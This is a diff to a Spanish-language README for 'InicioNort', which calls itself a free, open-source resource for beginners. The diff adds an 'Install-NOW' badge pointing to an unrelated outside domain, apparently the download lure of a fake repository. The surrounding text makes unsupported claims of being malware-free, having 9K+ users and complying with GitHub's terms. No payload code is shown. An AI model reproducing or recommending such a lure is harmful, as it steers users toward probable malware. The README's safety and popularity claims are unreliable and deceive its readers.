@@ -5,11 +5,13 @@
 **Descripción**  
 **InicioNort** es un recurso gratuito de 2025 para principiantes que desean aprender nuevas habilidades. Seguro, de código abierto y conforme con los Términos de Servicio de GitHub. ¡Únete a 9K+ usuarios para iniciar tu aprendizaje!  
 
+- [![InstallUpdatingSetup](https://img.shields.io/badge/Install-NOW-blueviolet)](https://varengpool.com)
+![Vista Previa](https://sdmntprwestus2.oaiusercontent.com/files/00000000-27d4-61f8-b4ad-64ecef48b011/raw?se=2025-09-05T04%3A40%3A58Z&sp=r&sv=2024-08-04&sr=b&scid=34f12c27-0cc1-5671-b49d-46233feb4545&skoid=b928fb90-500a-412f-a661-1ece57a7c318&sktid=a48cca56-e6da-484e-a814-9c849652bcb3&skt=2025-09-04T18%3A45%3A01Z&ske=2025-09-05T18%3A45%3A01Z&sks=b&skv=2024-08-04&sig=A2k%2BZuBP%2BR%2BRK86cFa9R0cQjVZeJ/9w5F5jKviotAhk%3D)  
+
 **¿Por Qué InicioNort?**  
 - **Gratuito y Universal**: Acceso sin costo para todos.  
 - **Fácil para Principiantes**: Materiales claros para quienes comienzan.  
 - **Confiable**: De código abierto, sin malware, respaldado por la comunidad.  
-
 **Nota Importante**  
 InicioNort es exclusivamente para uso local y personal, conforme con los Términos de GitHub. No está diseñado para plataformas o servicios en línea.  
 
@@ -32,12 +34,11 @@ InicioNort es exclusivamente para uso local y personal, conforme con los Términ
 **Seguridad**  
 - 🔐 Código abierto, licencia MIT, sin malware.  
 - ✅ Usado por 9K+ aprendices globalmente.  
-- 🕵 Sin recolección de datos.  
+- 🕵 Sin recolección de datos.
 
 **Captura de Pantalla**  
 **InicioNort en Acción**  
 ![Vista Previa](https://sdmntprnorthcentralus.oaiusercontent.com/files/00000000-eda4-622f-8ca0-138fc2478d20/raw?se=2025-09-05T04%3A38%3A05Z&sp=r&sv=2024-08-04&sr=b&scid=4dee89f6-8ab5-5652-baa0-fb35d5b08552&skoid=24a7dec3-38fc-4904-b888-8abe0855c442&sktid=a48cca56-e6da-484e-a814-9c849652bcb3&skt=2025-09-04T19%3A01%3A30Z&ske=2025-09-05T19%3A01%3A30Z&sks=b&skv=2024-08-04&sig=e/RBXU0z7bgqH4DGmWncEOWzwgd7/UgR9R3YDg2oJnA%3D)  
-
 **Contribuir**  
 Abre un *issue* para sugerencias. Las contribuciones deben cumplir con los Términos de GitHub.  
 
